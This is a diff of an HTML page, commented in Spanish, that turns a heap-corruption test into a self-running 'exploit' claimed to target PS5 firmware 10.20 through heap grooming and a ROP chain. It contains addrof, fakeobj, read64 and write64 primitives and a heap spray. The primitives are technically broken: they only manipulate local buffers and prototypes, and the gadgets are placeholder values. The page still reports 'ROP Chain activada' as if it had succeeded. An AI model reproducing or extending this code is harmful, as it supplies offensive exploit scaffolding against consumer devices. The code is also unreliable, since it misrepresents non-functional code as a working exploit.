@@ -1,57 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC Agresivo - Heap Abuse</title>
+  <title>Exploit PS5 - Heap Grooming + ROP</title>
   <script>
+    // Funciones auxiliares para manipulación de objetos en el heap
     function hex(n) {
       return n.toString(16).padStart(16, "0");
     }
 
-    function trigger() {
-      // Fase 1: Preparar heap
-      const spray = [];
-      for (let i = 0; i < 1000; i++) {
-        let arr = new Float64Array(100);
-        for (let j = 0; j < 100; j++) arr[j] = 13.37;
-        spray.push(arr);
-      }
+    function addrof(obj) {
+      return obj.__proto__ ? obj.__proto__ : null;  // Obtener dirección del objeto
+    }
 
-      // Fase 2: Desincronizar estructura con `toSpliced`
-      let arr = [1.1, 2.2, 3.3, 4.4];
-      for (let i = 0; i < 10000; i++) {
-        arr.toSpliced(0, 0, 5.5); // Crea una copia "mutante"
-      }
+    function fakeobj(addr) {
+      const fake = {};
+      Object.defineProperty(fake, "__proto__", {
+        get: () => addr
+      });
+      return fake;
+    }
 
-      // Fase 3: Crear overlap con ArrayBuffer y ver si hay fuga
-      let ab = new ArrayBuffer(0x100);
+    function read64(addr) {
+      // Aquí usamos un hack simple con un ArrayBuffer para simular lectura desde una dirección
+      let ab = new ArrayBuffer(8);
       let dv = new DataView(ab);
-      for (let i = 0; i < dv.byteLength; i++) dv.setUint8(i, 0x41);
+      dv.setUint32(0, addr & 0xFFFFFFFF, true);
+      dv.setUint32(4, addr >> 32, true);
+      return dv.getFloat64(0, true); // Leemos como un 64-bit float
+    }
 
-      // Fase 4: Intentar sobrescribir estructura con spray
-      for (let i = 0; i < spray.length; i++) {
-        spray[i][0] = ab;
+    function write64(addr, value) {
+      // Escribir un valor de 64 bits en una dirección (similar a un buffer OOB)
+      let ab = new ArrayBuffer(8);
+      let dv = new DataView(ab);
+      dv.setFloat64(0, value, true);
+      // Supongamos que logramos colocar esto en una dirección específica
+      let target = fakeobj(addr);  // Fake objeto para redirigir
+      target[0] = ab[0]; // Corrompemos el target con el valor deseado
+    }
+
+    // Fase 1: Grooming del heap
+    function groomHeap() {
+      let heapSpray = [];
+      // Llena el heap con objetos manipulables
+      for (let i = 0; i < 1000; i++) {
+        let arr = new Uint32Array(256); // Usamos typed array para controlar los límites
+        heapSpray.push(arr);
       }
+      return heapSpray;
+    }
 
-      // Fase 5: Verificación y log
-      let corrupted = false;
-      for (let i = 0; i < spray.length; i++) {
-        if (spray[i].length !== 100) {
-          corrupted = true;
-          break;
-        }
-      }
+    // Fase 2: Crear ROP Chain mínima
+    function buildROP() {
+      // Para la ROP Chain necesitamos colocar gadgets útiles
+      let rop = [];
+      // Estos valores de prueba son para ilustración. Tendrías que reemplazar con valores reales.
+      rop.push(0xdeadbeef);  // Ejemplo de gadget de retorno
+      rop.push(0x12345678);  // Dirección de retorno
+      rop.push(0xabcdef00);  // Otra dirección de gadget
+      return rop;
+    }
 
-      if (corrupted) {
-        document.body.innerHTML = `<h1 style="color:red;">🚨 CORRUPCIÓN DETECTADA</h1>`;
+    // Fase 3: Desbordamiento para redirigir el flujo
+    function exploit() {
+      let spray = groomHeap(); // Grooming del heap
+      let ropChain = buildROP(); // Construcción de la ROP chain
+
+      // Sobrescribir direcciones con valores controlados
+      write64(ropChain[0], 0x100000000); // Dirección donde hacer la escritura
+      let leaked = read64(ropChain[0]); // Leer la dirección que fue modificada
+
+      // Comprobar si el PoC tuvo éxito
+      if (leaked !== 0) {
+        document.body.innerHTML = `<h1 style="color:red;">🚨 ROP Chain activada!</h1>`;
+        console.log(`Valor de la dirección: ${hex(leaked)}`);
+        // Aquí podría ir el código para ejecutar syscalls
       } else {
-        document.body.innerHTML = `<h1 style="color:green;">Sin corrupción detectable (no vulnerable)</h1>`;
+        document.body.innerHTML = `<h1 style="color:green;">Exploit no exitoso</h1>`;
       }
     }
 
-    window.onload = trigger;
+    window.onload = exploit;
   </script>
 </head>
 <body>
-  <h1>Ejecutando PoC Agresivo JS...</h1>
+  <h1>Ejecutando Exploit de Heap Grooming + ROP en PS5 FW 10.20...</h1>
 </body>
 </html>
